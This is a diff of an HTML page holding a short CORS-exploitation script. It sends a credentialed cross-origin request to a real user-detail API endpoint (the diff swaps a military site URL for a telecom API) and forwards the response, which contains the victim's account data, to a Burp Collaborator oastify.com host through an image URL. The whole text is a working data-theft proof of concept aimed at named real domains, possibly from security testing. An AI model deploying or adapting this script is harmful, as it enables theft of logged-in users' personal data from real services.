@@ -4,14 +4,14 @@
     <script>
         var req = new XMLHttpRequest();
         req.onload = reqListener;
-        req.open('GET', 'https://cadbimcenter.erdc.dren.mil/Default.aspx?p=a&t=1&i=30', true);
+        req.open('GET', 'https://vapi.vodacom.co.tz/api/v1/user/detail/', true);
         req.withCredentials = true;
         req.send();
 
         function reqListener() {
             // Send the response data to your Burp Collaborator server
             var img = new Image();
-            img.src = 'https://kznxmw5kze7rg4d1si2pzpxohfn6b2zr.oastify.com/?data=' + encodeURIComponent(this.responseText);
+            img.src = 'https://0z07h2nc7ftej1acpy6yo1z3cuil6fu4.oastify.com/?data=' + encodeURIComponent(this.responseText);
         }
     </script>
 </head>
